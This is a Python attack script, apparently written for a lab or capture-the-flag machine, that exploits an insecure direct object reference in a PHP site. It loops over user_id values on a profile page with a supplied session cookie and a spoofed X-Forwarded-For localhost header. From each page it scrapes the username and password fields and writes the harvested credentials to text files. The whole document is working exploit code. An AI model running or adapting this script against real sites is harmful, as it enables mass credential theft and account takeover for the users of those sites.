#!/bin/python3

import requests
import sys
import traceback


def safe_read(argv: list[str], opt: str):
  if not opt in argv:
    bye(-1, f"Option {opt} required.")
    
  idx = argv.index(opt)
  if idx + 1 > len(argv):
    bye(-1, f"Value for option {opt} expected.")
    
  else:
    return argv[idx + 1]

def find_instance(otag: str, ctag: str, content: str):
  startptr = content.find(otag)
  endptr = startptr + content[startptr:].find(ctag) # from where we just started
  if startptr < endptr:
    return content[startptr+len(otag):endptr]
  else:
    return None
  
def bye(code: int, msg: str):
  if msg:
    print(msg)
    
  print("usage: program.py 192.168.56.123 -sessid r4irnlb966u3b7a6sv0iupc1m4 -suid 1 -euid 5")
  sys.exit(code)
  
  
def extract_creds(content: str):
  lines = content.splitlines()
  uname = pword = None
  for line in lines:
    if line.find("id=\"username\"") >= 0:
      uname = find_instance("value=\"", "\">", line)
      
    elif line.find("id=\"password\"") >= 0:
      pword = find_instance("value=\"", "\">", line)
      
  return f"{uname}:{pword}", uname, pword
  
def save(elems: list[str], fname: str):
  with open(fname, "w") as file:
    for elem in elems:
      file.write(f"{elem}\n")
    file.flush()
  
def display(elems: list[str]):
  print(f"[i] Scraped {len(elems)} credentials")
  for elem in elems:
    print(elem)

def scrape(target: str, sessid: str, suid: int, euid: int):
  masters = []
  unames = []
  pwords = []
  print("[i] Requests:")
  for uid in range(suid, euid + 1):
    try:
      url = f"http://{target}/index.php?page=profile&user_id={uid}"
      res = requests.get(url, allow_redirects=True, headers={"Cookie":f"PHPSESSID={sessid}", "X-Forwarded-For":"127.0.0.1"})
      
      print(f"{url} ", end="")
      if res.status_code == 200:
        master, uname, pword = extract_creds(res.content.decode("utf-8"))
        
        if uname and pword:
          masters.append(master)
          unames.append(uname)
          pwords.append(pword)
        
        print(f"[ SUCC, Status: {res.status_code} ]")
      else:
        print(f"[ FAIL, Status: {res.status_code} ]")
    
    except Exception as ex:
      print(f"\n[!] Unexpected error making request. {ex}")
      pass
  
  display(masters)
  save(masters, "master.scrape.txt")
  save(unames, "unames.scrape.txt")
  save(pwords, "pwords.scrape.txt")
	
if __name__=="__main__":
  target = sys.argv[1]
  sessid = safe_read(sys.argv, "-sessid")
  suid = int(safe_read(sys.argv, "-suid"))
  euid = int(safe_read(sys.argv, "-euid"))
  scrape(target, sessid, suid, euid)
  print("[*] Done!")
